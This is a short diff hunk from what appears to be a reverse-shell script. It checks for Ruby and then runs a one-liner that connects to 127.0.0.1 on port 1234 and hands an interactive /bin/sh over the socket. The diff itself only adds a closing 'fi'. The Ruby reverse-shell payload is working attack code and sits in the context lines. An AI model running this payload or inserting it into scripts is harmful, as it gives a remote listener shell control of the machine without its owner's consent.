@@ -47,3 +47,4 @@ fi
 if command -v ruby > /dev/null 2>&1; then
 	ruby -rsocket -e 'f=TCPSocket.open("127.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d 2>&%d",f,f,f);'
 	exit;
+fi
